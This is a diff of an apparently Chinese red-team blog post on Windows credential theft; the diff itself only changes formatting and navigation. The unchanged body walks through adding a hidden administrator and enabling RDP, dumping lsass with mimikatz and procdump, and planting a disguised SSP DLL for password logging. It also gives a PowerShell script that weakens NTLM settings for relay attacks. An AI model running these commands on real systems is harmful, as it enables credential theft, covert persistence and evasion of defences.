@@ -46,7 +46,7 @@
 </script>
 
     <title>Windows凭据窃取（一） - Blog</title>
-  <meta name="generator" content="Hexo 5.3.0"></head>
+  <meta name="generator" content="Hexo 5.4.0"></head>
 
   <body><div id="mobile-navbar" class="mobile-navbar">
   <div class="mobile-header-logo">
@@ -127,6 +127,7 @@
 <h2 id="Mimikatz非交互执行"><a href="#Mimikatz非交互执行" class="headerlink" title="Mimikatz非交互执行"></a>Mimikatz非交互执行</h2><p>在很久很久以前，通过<code>高卢神器Mimikatz</code>扒Windows的系统密码，就已经是横向移动的标配手段之一。那时候，运维对 AV / EDR / IDS / IPS 还没什么概念，更不用提威胁情报、欺骗防御了。于是只要找个论坛下载原封不动编译好的猕猴桃，远程桌面连上去就能扒下更多的账户密码。</p>
 <p>可能有同学要怼我了，你密码都不知道怎么连远程桌面扒密码？前辈们其实也遇到了这个问题，所以除了RDP密码泄漏这种途径，常常会先添加一个伪装成机器用户的管理员：</p>
 <figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">:: 添加用户</span><br><span class="line"><span class="built_in">net</span> user system$ Passw0rd! /add</span><br><span class="line">:: 加入管理员组</span><br><span class="line"><span class="built_in">net</span> localgroup administrators system$ /add</span><br><span class="line">:: 开启远程登录</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d <span class="number">0</span> /f</span><br><span class="line">:: 查询端口</span><br><span class="line">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</span><br></pre></td></tr></table></figure>
+
 <p>又或者通过WebShell非交互式地将输出重定向到文件：</p>
 <p><code>mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; hash.txt</code></p>
 <p>这引起了某些反病毒软件（AV）的注意，它们将<code>“mimikatz”</code>加入了特征库，也有的会拦截WebShell加系统用户的行为。这时常用的绕过技术有了两条分支，一种是对mimikatz做免杀，另一种是dump存在密钥的lsass进程。</p>
@@ -151,6 +152,7 @@
 </ul>
 <h2 id="进程dump"><a href="#进程dump" class="headerlink" title="进程dump"></a>进程dump</h2><p>静态免杀能过动态行为不一定能过，上面纯属耍小聪明运气好罢了，Mimikatz本身调用了大量WinAPI，改起来有亿点门槛。在网络环境好的情况下，可以dump出lsass进程并将内存dump文件下载回本地读取：</p>
 <figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
 <p>起初可以用各种工具Dump lsass进程，后来一般只有<code>SysinternalsSuite</code>的<code>procdump</code>才不会告警了。</p>
 <ul>
 <li>GUI环境下也可以利用任务管理器等程序</li>
@@ -159,12 +161,14 @@
 <p><img src="/img/winkeyqqa_g.png"></p>
 <p>至此我们需要了解一个叫SSP（Security Support Provider）的东西，它是SSPI（Security Support Provider Interface）这个Windows认证API的具体dll实现，通过<code>EnumerateSecurityPackages</code>接口可以枚举出已加载的SSP。mimilib.dll就具备SSP的功能，需要在注册表中添加Dll路径并调用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-addsecuritypackagea">AddSecurityPackage API</a>加载SSP（或者重启）：</p>
 <figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v &quot;Security Packages&quot; /t REG_MULTI_SZ /d &quot;pslib64.dll&quot; /f</span><br></pre></td></tr></table></figure>
+
 <p><img src="/img/winkeyqqa_h.png"></p>
 <ul>
 <li>放在System32目录的pslib64.dll为免杀的mimilib.dll，图中伪装为<code>DPA SSP</code></li>
 </ul>
 <p>发生锁屏登录或是runas等认证行为后，会将明文密码记录在System32下的<code>msgsm64.acm</code>中（默认在kiwissp.log）：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[00000000:000003e7] [00000002] WORKGROUP\WIN2019$ (WIN2019$)	</span><br><span class="line">[00000000:0000b1bd] [00000002] WORKGROUP\WIN2019$ (UMFD-0)	</span><br><span class="line">[00000000:0000b1dd] [00000002] WORKGROUP\WIN2019$ (UMFD-1)	</span><br><span class="line">[00000000:000003e4] [00000005] WORKGROUP\WIN2019$ (NETWORK SERVICE)	</span><br><span class="line">[00000000:000108e8] [00000002] WORKGROUP\WIN2019$ (DWM-1)	</span><br><span class="line">[00000000:00010927] [00000002] WORKGROUP\WIN2019$ (DWM-1)	</span><br><span class="line">[00000000:000003e5] [00000005] \ (LOCAL SERVICE)	</span><br><span class="line">[00000000:000205d2] [00000002] WIN2019\ryan (ryan)	toor</span><br><span class="line">[00000000:0002064b] [00000002] WIN2019\ryan (ryan)	toor</span><br></pre></td></tr></table></figure>
+
 <p>这样做好处就是能扒到明文密码、会进行持久化更新和记录，坏处就是Dll要免杀、有时候也并不一定要持久化或是拿到明文密码才行，并且需要修改注册表、调用<code>AddSecurityPackage API</code>、可被<code>EnumerateSecurityPackages API</code>枚举查看、还要等一个有缘人触发登录行为。</p>
 <p>很多时候会有点得不偿失，于是XPN在对<code>Mimikatz</code>和<code>Secur32.dll</code>跟进深入分析后，发现了以下几个要点：</p>
 <ol>
@@ -223,6 +227,7 @@
 <p><img src="/img/winkeyqqa_r.png"></p>
 <p>这是因为<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/smbv1-not-installed-by-default-in-windows">高版本</a>的Windows服务器上可能不存在SMBv1客户端，其次LMCompatibilityLevel的值也会有影响。可以利用PowerShell修改注册表并安装SMBv1客户端，<strong>注意会导致系统重启！</strong></p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Set-Relay</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment"># LMCompatibilityLevel</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa\&quot;</span> /v lmcompatibilitylevel /t REG_DWORD /d <span class="number">2</span> /f</span><br><span class="line"><span class="comment"># NTLMMinClientSec</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\&quot;</span> /v NtlmMinClientSec /t REG_DWORD /d <span class="number">536870912</span> /f</span><br><span class="line"><span class="comment"># RestrictSendingNTLMTraffic</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\&quot;</span> /v RestrictSendingNTLMTraffic /t REG_DWORD /d <span class="number">0</span> /f</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable SMBv1</span></span><br><span class="line"><span class="built_in">Enable-WindowsOptionalFeature</span> <span class="literal">-Online</span> <span class="literal">-FeatureName</span> smb1protocol</span><br><span class="line"><span class="comment"># DisableLoopbackCheck</span></span><br><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\&quot;</span> /v LsaDisableLoopbackCheck /t REG_DWORD /d <span class="number">1</span> /f</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Set-Relay</span></span><br></pre></td></tr></table></figure>
+
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://blog.xpnsec.com/exploring-mimikatz-part-2/">Exploring Mimikatz - Part 2 - SSP</a></p>
 <p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/Mimikatz%E4%B8%ADSSP%E7%9A%84%E4%BD%BF%E7%94%A8/">Mimikatz中SSP的使用</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/#44-%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA%E7%9A%84%E5%AF%B9%E6%8A%97">这是一篇“不一样”的真实渗透测试案例分析文章</a></p>
@@ -242,7 +247,12 @@
             <a href="/tags/ntlm/">ntlm</a>
             </div>
         
-        <nav class="post-nav"><a class="next" href="/2021/01/11/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">
+        <nav class="post-nav"><a class="prev" href="/2021/05/29/CS43%E4%BC%AA%E7%A0%B4%E8%A7%A3%E4%B8%8E%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">CS43伪破解与二次开发</span>
+        <span class="prev-text nav-mobile">上一篇</span>
+      </a>
+    <a class="next" href="/2021/01/11/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">
         <span class="next-text nav-default">Windows权限维持</span>
         <span class="prev-text nav-mobile">下一篇</span>
         <i class="iconfont icon-right"></i>
